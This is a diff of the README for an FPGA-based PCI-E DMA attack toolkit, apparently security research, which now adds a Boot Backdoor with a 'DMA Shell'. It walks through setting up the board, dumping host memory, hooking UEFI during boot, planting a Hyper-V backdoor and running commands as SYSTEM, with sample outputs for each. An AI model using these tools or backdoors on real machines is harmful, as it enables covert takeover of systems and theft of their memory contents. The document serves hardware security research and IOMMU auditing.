@@ -14,36 +14,46 @@
 
 ## General Information
 
-This repository contains a set of tools and proof of concepts related to PCI-E bus and [DMA attacks](https://en.wikipedia.org/wiki/DMA_attack). It includes HDL design which implements software controllable PCI-E gen 1.1 endpoint device for [Xilinx SP605 Evaluation Kit](https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html) with Spartan-6 FPGA. In comparison with popular [USB3380EVB](http://www.hwtools.net/Adapter/USB3380EVB.html) this design allows to operate with raw Transaction Level Packets (TLP) of PCI-E bus and perform full 64-bit memory read/write operations. To demonstrate applied use cases of the design, [there's a tool](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) for pre-boot DMA attacks on UEFI based machines which allows executing arbitrary UEFI DXE drivers during platform init. [Another example](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_hv.py) shows how to use pre-boot DMA attacks to inject [Hyper-V VM exit handler backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/src/DmaBackdoorHv.c) into the [virtualization-based security](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) enabled Windows 10 Enterprise running on UEFI Secure Boot enabled platform. Provided Hyper-V backdoor PoC might be useful for reverse engineering and exploit development purposes, it [provides an interface](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_library/backdoor_library.cpp) for inspecting of hypervisor state (VMCS, physical/virtual memory, registers, etc.) from guest partition and perform the guest to host VM escape attacks. 
+This repository contains a set of tools and proof of concepts related to PCI-E bus and [DMA attacks](https://en.wikipedia.org/wiki/DMA_attack). It includes HDL design that implements software controllable PCI-E gen 1.1 endpoint device for [Xilinx SP605 Evaluation Kit](https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html) with Spartan-6 FPGA. In comparison with popular [USB3380EVB](http://www.hwtools.net/Adapter/USB3380EVB.html) this design allows to operate with raw Transaction Level Packets (TLP) of PCI-E bus and perform full 64-bit memory read/write operations. To demonstrate applied use cases of the design, [there's a tool](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) for pre-boot DMA attacks on UEFI based machines which allows to execute arbitrary UEFI DXE drivers during platform init.  
 
-**Hyper-V backdoor part of this project has many other features and deployment options than described in this document, you can use it separately from DMA attack tools even without any special hardware: [check its documentation](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv)**
+[There's a program](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_hv.py) that shows how to use pre-boot DMA attacks to inject [Hyper-V VM exit handler backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/src/DmaBackdoorHv.c) into the [virtualization-based security](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) enabled Windows 10 Enterprise running on UEFI Secure Boot enabled platform. Provided Hyper-V Backdoor PoC might be useful for reverse engineering and exploit development purposes, it [provides an interface](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_library/backdoor_library.cpp) for inspecting of hypervisor state (VMCS, physical/virtual memory, registers, etc.) from the guest partition and perform guest to host VM escape attacks.  
 
-**Python tools and payloads from this project, including Hyper-V backdoor, also can be used with Xilinx Zynq-7000 SoC based boards. There's [a separate project](https://github.com/Cr4sh/zc_pcie_dma) of DMA attacks design for Xilinx ZC706 evaluation kit.**
+[Another program](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_boot.py) shows how to use pre-boot DMA attacks to inject arbitrary user mode or kernel mode code into the Windows operating system by hijacking of its boot process using [Boot Backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/src/DmaBackdoorBoot.c). This program is also can work with DMA Shell &minus; it's Boot Backdoor payload that allows to execute console commands over the rogue PCI-E device, transfer files and load 3-rd party executables into the target operating system at the runtime.  
+
+**Hyper-V Backdoor part of this project has many other features and deployment options than described in this document, you can use it separately from DMA attack tools even without any special hardware: [check its documentation](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv)**  
+
+**Boot Backdoor part of this project has many other features and deployment options than described in this document, you can use it separately from DMA attack tools even without any special hardware: [check its documentation](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot)**  
+
+**Python tools and payloads from this project, including Hyper-V Backdoor, also can be used with Xilinx Zynq-7000 SoC based boards. There's [a separate project](https://github.com/Cr4sh/zc_pcie_dma) of DMA attacks design for Xilinx ZC706 evaluation kit.**
 
 
 ## Contents
 
 * `s6_pcie_microblaze.xise` &minus; Xilinx ISE project file. 
 
-* `microblaze/pcores/axis_pcie_v1_00_a` &minus; Custom peripheral module which allows connecting PCI Express integrated endpoint block of Spartan-6 FPGA as raw TLP stream to MicroBlaze soft processor core. 
+* `microblaze/pcores/axis_pcie_v1_00_a/` &minus; Custom peripheral module that allows connecting of PCI Express integrated endpoint block of Spartan-6 FPGA as raw TLP stream to MicroBlaze soft processor core. 
 
-* `sdk/srec_bootloader_0` &minus; Simple bootloader for MicroBlaze soft processor, it using SREC image format and onboard linear flash memory of SP605 to load and store main MicroBlaze program. 
+* `sdk/srec_bootloader_0/` &minus; Simple bootloader for MicroBlaze soft processor, it using SREC image format and onboard linear flash memory of SP605 to load and store main MicroBlaze program. 
 
-* `sdk/main_0` &minus; Main program for MicroBlaze soft processor, it forwards raw TLP packets of PCI-E bus into the TCP connection using onboard Ethernet port of SP605 and [lwIP network stack](http://www.nongnu.org/lwip/2_0_x/index.html). 
+* `sdk/main_0/` &minus; Main program for MicroBlaze soft processor, it forwards raw TLP packets of PCI-E bus into the TCP connection using onboard Ethernet port of SP605 and [lwIP network stack](http://www.nongnu.org/lwip/2_0_x/index.html). 
 
-* `python/pcie_lib.py` &minus; Python library that talks over the network to main MicroBlaze program running on SP605 board.
+* `python/pcie_lib.py` &minus; Python library to interact over the network with main MicroBlaze program running on SP605 board, it implements various low level and high level abstractions to work with TLP level of PCI-E from the Python code.
 
 * `python/pcie_mem.py` &minus; Command line program that dumps host RAM into the screen or output file by sending MRd TLPs.
 
 * `python/pcie_mem_scan.py` &minus; Command line program that scans target host for physical memory ranges accessible over PCI-E bus, it's useful for a security audit of IOMMU enabled platforms (examples: [1](https://twitter.com/d_olex/status/886050560637493248), [2](https://twitter.com/d_olex/status/886093746651013120), [3](https://twitter.com/d_olex/status/886320724641628160), [4](https://twitter.com/d_olex/status/886399248706682881)).
 
-* `python/uefi_backdoor_simple.py` &minus; Command line program for pre-boot DMA attack which injects dummy UEFI driver into the target.
+* `python/uefi_backdoor_simple.py` &minus; Command line program for pre-boot DMA attack that injects dummy UEFI driver into the target machine boot sequence.
 
-* `python/uefi_backdoor_hv.py` &minus; Command line program for pre-boot DMA attack which injects Hyper-V VM exit handler backdoor into the target.
+* `python/uefi_backdoor_hv.py` &minus; Command line program for pre-boot DMA attack that injects Hyper-V VM exit handler backdoor into the target system boot sequence.
 
-* `python/payloads/DmaBackdoorSimple` &minus; Dummy UEFI DXE driver.
+* `python/uefi_backdoor_boot.py` &minus; Command line program for pre-boot DMA attack that injects Boot Backdoor into the target system boot sequence.
 
-* `python/payloads/DmaBackdoorHv` &minus; UEFI DXE driver which implements Hyper-V backdoor and backdoor client. 
+* `python/payloads/DmaBackdoorSimple/` &minus; Source code of dummy UEFI DXE driver to use with `uefi_backdoor_simple.py`.
+
+* `python/payloads/DmaBackdoorHv/` &minus; Source code of UEFI DXE driver to use with `uefi_backdoor_hv.py`, it implements Hyper-V Backdoor functionality. 
+
+* `python/payloads/DmaBackdoorBoot/` &minus; Source code of UEFI DXE driver to use with `uefi_backdoor_boot.py`, it implements Boot Backdoor functionality. 
 
 
 ## SP605 Board Configuration
@@ -54,9 +64,9 @@ Xilinx UG526 document also known as [SP605 Hardware User Guide](https://www.xili
 
 1) To load bitstream from onboard SPI flash chip you need to configure SP605 by turning `SW1` switches into the 1-ON, 2-OFF position.
 
-2) Now you have to write FPGA bitstream into the SPI flash. Use `s6_pcie_microblaze.mcs` file if you want to do it over JTAG with the help of Xilinx iMPACT utility (see [this tutorial](https://www.xilinx.com/support/documentation/boards_and_kits/sp605_PCIe_Gen1_x1_pdf_xtp065_13.4.pdf)), or `s6_pcie_microblaze.bin` if you're going to use [external SPI programmer](https://www.flashrom.org/Supported_programmers) connected to `J17` header of SP605 (which is the most faster and convenient way). 
+2) Now you have to write FPGA bitstream into the SPI flash. Use `s6_pcie_microblaze.mcs` file if you want to do this over JTAG with the help of Xilinx iMPACT utility (see [this tutorial](https://www.xilinx.com/support/documentation/boards_and_kits/sp605_PCIe_Gen1_x1_pdf_xtp065_13.4.pdf)), or `s6_pcie_microblaze.bin` if you want to use [external SPI flash programmer](https://www.flashrom.org/Supported_programmers) connected to `J17` header of SP605 (which is the fastest and more convenient way). 
 
-In case of [flashrom](https://www.flashrom.org/) compatible external SPI programmer you can use `flash_to_spi.py` program as a flashrom wrapper:
+In case of [flashrom](https://www.flashrom.org/) compatible SPI flash programmer you can use `flash_to_spi.py` program as a flashrom wrapper:
 
 ```
 $ ./flash_to_spi.py linux_spi:dev=/dev/spidev1.0 s6_pcie_microblaze.bin
@@ -69,11 +79,11 @@ Warning: Chip content is identical to the requested image.
 Erase/write done.  
 ```
 
-3) Bitstream which was written into the SPI flash in previous step includes a bootloader for MicroBlaze core (see [bootloader.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/srec_bootloader_0/src/bootloader.c) for more details). This bootloader allows to configure board options and write main program into the linear flash.
+3) Bitstream file that was written into the SPI flash in previous step includes custom bootloader for MicroBlaze core (see [bootloader.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/srec_bootloader_0/src/bootloader.c) for more details). This bootloader allows to configure board options and write main program into the linear flash over the UART port of SP605.
 
-To boot MicroBlaze into the update mode you have to disconnect SPI programmer and power up the board holding `SW4` pushbutton switch, release `SW4` when `DS6` LED indicating active update mode turns on. 
+To boot MicroBlaze into the update mode you have to disconnect SPI flash programmer and power the board holding `SW4` pushbutton switch, release `SW4` when `DS6` LED indicating active update mode turns on. 
 
-4) To write the main program (see [main.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/main_0/src/main.c) for more details) into the linear flash connect your computer to UART bridge USB port of SP605 and run `bootloader_ctl.py` program with `--flash` option:
+4) To write main program (see [main.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/main_0/src/main.c) for more details) into the linear flash you need to connect your computer to the UART bridge USB port of SP605 and run `bootloader_ctl.py` program with `--flash` option:
 
 ```
 $ easy_install pyserial
@@ -91,7 +101,7 @@ Writing 0x8c bytes at 0x00152f00
 [+] DONE
 ```
 
-5) To configure board network settings run `bootloader_ctl.py` program with `--config` option:
+5) To configure the network settings you need to run `bootloader_ctl.py` program with `--config` option:
 
 ```
 $ ./python/bootloader_ctl.py /dev/ttyUSB0 --config 192.168.2.247:255.255.255.0:192.168.2.1:28472
@@ -126,11 +136,11 @@ auto-negotiated link speed: 100
 start_application(): TCP server is started at port 28472
 ```
 
-Main program prints it's error messages into the onboard UART, you can use `--console` option of `bootloader_ctl.py` to monitor those messages in real time. 
+Main program prints its error messages into the onboard UART, you can use `--console` option of `bootloader_ctl.py` to monitor this messages in real time. 
 
-7) Connect SP605 to the PCI-E slot of the target computer and turn the computer on. When PCI-E link was sucessfully established SP605 will fire `DS3` and `DS4` LEDs.
+7) Connect SP605 to the PCI-E slot of the target computer and turn the computer on. When PCI-E link was successfully established you will see `DS3` and `DS4` LEDs on.
 
-8) Run `lspci` command on target computer to ensure that it is seeing your board as PCI-E device:
+8) Run `lspci` command on target computer to ensure that its operating system is seeing your board as appropriate PCI-E device:
 
 ```
 # lspci | grep Xilinx
@@ -148,7 +158,7 @@ Xilinx SP605 board is also can be connected to the Thunderbolt 2/3 external port
 
 ## Software Configuration
 
-Python tools to interact with the board and tiny implementation of PCI-E link layer are located in `python` folder. Because main MicroBlaze program uses TCP to transfer TLP packets no any drivers or 3rd party dependencies needed, you can use provided Python code on any operating system. 
+Python tools to interact with the board and tiny implementation of PCI-E transaction layer are located in `python` folder. Because main MicroBlaze program uses TCP connection to transfer TLP packets no any drivers or 3rd party dependencies needed, you can use provided Python code on any operating system. 
 
 To set up target board IP address and port edit `PCIE_TO_TCP_ADDR` variable in `python/pcie_lib_config.py` file.
 
@@ -190,7 +200,7 @@ Example of PCI-E device as it shown in Apple macOS hardware information when con
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/macos_pcie.png" width="623" height="369">
 
 
-On attacker side you can use `pcie_cfg.py` program to view configuration space registers of PCI-E device:
+On the attacker side you can use `pcie_cfg.py` program to view configuration space registers of PCI-E device:
 
 ```
 $ ./pcie_cfg.py
@@ -250,7 +260,7 @@ $ ./pcie_cfg.py -x
 
 ```
 
-Dumping 0x80 bytes of target computer physical memory at zero address:
+Here's an example of dumping 0x80 bytes of target computer physical memory starting from zero address using `pcie_mem.py` program:
 
 ```
 $ DEBUG_TLP=1 ./pcie_mem.py 0x0 0x80
@@ -288,7 +298,7 @@ TLP RX: size = 0x04, source = 00:00.0, type = CplD
 00000070: 53 ff 00 f0 a4 f0 00 f0 c7 ef 00 f0 b1 99 00 c0 | S...............
 ```
 
-Saving physical memory into the file:
+Example of saving physical memory into the file:
 
 ```
 ./pcie_mem.py 0x14000000 0x8000 dumped.bin
@@ -306,7 +316,7 @@ Saving physical memory into the file:
 32768 bytes written into the dumped.bin
 ```
 
-Provided Python software uses some environment variables to override values of certain options:
+Provided Python software uses some environment variables to override default values of certain options:
 
 * `DEBUG_TLP` &minus; If set to `1` print TX and RX TLP packets dump into the standard output.
 
@@ -315,9 +325,9 @@ Provided Python software uses some environment variables to override values of c
 
 ## Using Python API
 
-Python library `pcie_lib.py` provides low level API to send and receive PCE-E TLP requests, abstractions for different TLP types and high level physical memory access API.
+Python library `pcie_lib.py` provides low level API to send and receive PCE-E TLP packets along with abstractions for different TLP types and high level physical memory access API.
 
-The following program demonstrates how to work with raw TLPs using pcie_lib:
+The following program demonstrates how to work with raw TLPs using `pcie_lib.py`:
 
 ```python
 from pcie_lib import *
@@ -376,7 +386,7 @@ assert isinstance(tlp_rx, dev.PacketCplD)
 print('%.8x' % tlp_rx.data[0])
 ```
 
-Accessing physical memory:
+Accessing physical memory with high level API:
 
 ```python
 # write bytes to memory
@@ -486,7 +496,7 @@ Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0bd4
 [+] DONE
 ```
 
-UEFI DXE driver of Hyper-V backdoor is also displaying its debug messages on the screen. In addition, you can use `--debug-output` option of `uefi_backdoor_hv.py` to read this debug messages from the target system physical memory and print them into the stdout:
+UEFI DXE driver of Hyper-V Backdoor is also printing its debug messages on the screen. In addition, you can use `--debug-output` option of `uefi_backdoor_hv.py` to read this debug messages from the target system physical memory and print them into the stdout:
 
 ```
 $ ./uefi_backdoor_hv.py --debug-output
@@ -521,15 +531,72 @@ DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\hv.exe"
 DmaBackdoorHv.c(560) : new_ExitBootServices() called
 ```
 
-To get more information about Hyper-V backdoor use cases and features [check its README file](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/README.MD) with detailed information.
+To get more information about Hyper-V Backdoor use cases and features [check its README file](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/README.MD) with detailed information.
 
-Both `uefi_backdoor_simple.py` and `uefi_backdoor_hv.py` programs supports two different ways to pass execution to the injected UEFI DXE driver image:
+Python programs `uefi_backdoor_boot.py` and `uefi_backdoor_boot_shell.py` are used to inject Boot Backdoor into the target system boot sequence. Boot Backdoor allows to run arbitrary user mode or kernel mode code under the Windows operating system and its payload called DMA Shell allows to execute console commands and transfer the files. To deploy Boot Backdoor with DMA Shell payload using pre-boot DMA attack you have to perform the same steps as described above but using `uefi_backdoor_boot_shell.py` program:
+
+```
+$ ./uefi_backdoor_boot_shell.py --command "whoami"
+[+] 44544 bytes of payload image read
+[+] 21299 bytes of payload image after the compression
+[+] Using UEFI system table hook injection method
+[+] Waiting for PCI-E link...
+[!] PCI-E endpoint is not configured by root complex yet
+[!] PCI-E endpoint is not configured by root complex yet
+[!] PCI-E endpoint is not configured by root complex yet
+[!] Bad MRd TLP completion received
+[!] Bad MRd TLP completion received
+[+] PCI-E link with target is up
+[+] Device address is 01:00.0
+[+] Looking for DXE driver PE image...
+[+] PE image is at 0x7a070000
+[+] EFI_SYSTEM_TABLE is at 0x7a03e018
+[+] EFI_BOOT_SERVICES is at 0x7a38fa30
+[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
+Backdoor image size is 0x14847
+Backdoor entry RVA is 0x908
+Planting DXE stage driver at 0xc0000...
+Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0908
+1.759079 sec.
+[+] DXE driver was planted, waiting for backdoor init...
+[+] DXE driver was executed, you can read its debug messages by running this program with --debug-output option
+[+] Waiting for backdoor load...
+[+] Winload image was loaded
+
+              Image base: 0x0086a000
+ OslArchTransferToKernel: 0x009c4b20
+
+[+] DONE
+[+] Waiting for payload init...
+[+] Payload shared memory region is at 0x00200000
+[+] Executing command: whoami
+[+] Process exit code: 0x00000000
+
+nt authority\system
+```
+
+Now, when Boot Backdoor with its payload is deployed, you can run `uefi_backdoor_boot_shell.py` with `--attach` option to communicate with already running instance of DMA Shell:
+
+```
+$ ./uefi_backdoor_boot_shell.py --attach --command "dir C:\\"
+[+] PCI-E link with target is up
+[+] Device address is 01:00.0
+[+] Payload shared memory region is at 0x00200000
+[+] Executing command: hostname
+[+] Process exit code: 0x00000000
+
+DESKTOP-E52IJJ8
+```
+
+To get more information about Boot Backdoor and DMA Shell use cases and features [check its README file](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/README.MD) with detailed information.
+
+Python programs `uefi_backdoor_simple.py`, `uefi_backdoor_hv.py`, `uefi_backdoor_boot.py` and `uefi_backdoor_boot_shell.py` supports two different ways to pass execution to the injected UEFI DXE driver image:
 
  * `EFI_SYSTEM_TABLE` hijack &minus; scan system memory down from physical address `0xf0000000` to `0` with `0x10000` bytes step in order to find EFI system table by its signature and patch `LocateProtocol()` function address. To override memory scan options you can use `SCAN_FROM` and `SCAN_STEP` environment variables.
 
  * `PROTOCOL_ENTRY` hijack &minus; scan system memory up from physical address `0x76000000` to `0xa0000000` with `0x1000` bytes step to find `EFI_CPU_IO2_PROTOCOL` structure of [CPU I/O 2 protocol](https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/CpuIo2.h) and patch one of its functions. To override memory scan options you can use `SCAN_FROM`, `SCAN_TO` and `SCAN_STEP` environment variables.
 
-By default both programs are using EFI system table hijack method, to use protocol entry method instead you can pass `--inj-prot` command line option to the appropriate python script. To reduce amount of time required to perform the attack you can specify previously found `EFI_SYSTEM_TABLE` structure address using `--system-table` option and `PROTOCOL_ENTRY` structure address using `--prot-entry` option. Also, both `uefi_backdoor_simple.py` and `uefi_backdoor_hv.py` programs has `--test` command line option, this option is used to do the memory scan and find required structures addresses without performing an actual hijack of the execution flow.
+By default all the programs are using EFI system table hijack method, to use protocol entry method instead you can pass `--inj-prot` command line option to the appropriate python script. To reduce amount of time required to perform the attack you can specify previously found `EFI_SYSTEM_TABLE` structure address using `--system-table` option and `PROTOCOL_ENTRY` structure address using `--prot-entry` option. Also, both `uefi_backdoor_simple.py` and `uefi_backdoor_hv.py` programs has `--test` command line option, this option is used to do the memory scan and find required structures addresses without performing an actual hijack of the execution flow.
 
 During development of malicious code for pre-boot DMA attacks it's important to have an information about execution environment of UEFI DXE phase. To collect such information you can turn the target computer on, enter into the BIOS setup menu or boot options menu to pause loading of the operating system and run `uefi.py` program without arguments. This program will scan physical memory of the target computer and print various information about existing UEFI DXE protocols and interfaces, loaded UEFI drivers, UEFI descriptor tables and ACPI tables. Here you can see [an example](https://gist.github.com/Cr4sh/206daf97b57c050392415616a30c3ca9) of information obtained by `uefi.py` program while using [AAEON UP Squared](https://www.aaeon.com/en/p/iot-gateway-maker-boards-up-squared) mini-PC as attack target.
 
@@ -626,15 +693,15 @@ ROM read: size = 2, offset = 0x2C
 
 ## Troubleshooting
 
-PCI Express is very complicated high speed bus so there's a lot of things that can go wrong. If DMA attack is not working on your setup you might check the following things to determine the exact problem:
+PCI Express is very complicated high speed bus so there's a lot of things that can go wrong. In case when DMA attack is not working on your setup you can check the following things to determine an exact problem:
 
-* `DS3` LED is on when physical PCI-E link is up and `DS4` is on when root complex had assigned bus:device.function address to our PCI-E endpoint. If `DS3` is off it likely means physical connectivity issue &minus; check your risers, cables, etc. If `DS3` is on but `DS4` is off it means that you had to reboot your attack target or force PCI-E devices rescan on it's side. 
+* `DS3` LED is on when physical PCI-E link is up and `DS4` is on when root complex had assigned bus-device-function address to our PCI-E endpoint. If `DS3` is off it likely means physical connectivity issue &minus; check your risers, cables, etc. If `DS3` is on but `DS4` is off it means that you had to reboot your attack target or force PCI-E devices rescan on its side. 
 
 * `DS5` LED is on during PCI-E bus reset, when it always on it means physical connectivity issue.
 
-* If root complex sends Cpl TLP instead of CplD TLP in reply to memory read request it means that memory access was rejected because of invalid address or IOMMU enforced access checks. Also typical x86 machine might not reply at all on memory read requests to some certain physical address space regions. 
+* If root complex sends Cpl TLP instead of CplD TLP in reply to memory read request it means that memory access was rejected because of invalid address or IOMMU enforced access checks. Also, typical x86 machine might not reply at all on memory read requests to certain MMIO regions of physical address space. 
 
-* If software receiving inconsistent or invalid TLPs from root complex in reply to memory read requests you might try to set a smaller value of `MEM_RD_TLP_LEN` constant in `pcie_lib.py` to split reply data into more smaller chunks. Also it's useful to run the program with `DEBUG_TLP=1` environment variable and check raw TX/RX TLP dump.
+* If software is receiving inconsistent or invalid TLPs from the root complex in reply to the memory read requests you might try to set a smaller value of `MEM_RD_TLP_LEN` constant in `pcie_lib.py` to split reply data into more smaller chunks. Also it's useful to run the program with `DEBUG_TLP=1` environment variable and check raw TX/RX TLPs dump.
 
 
 ## Building Project From the Source Code
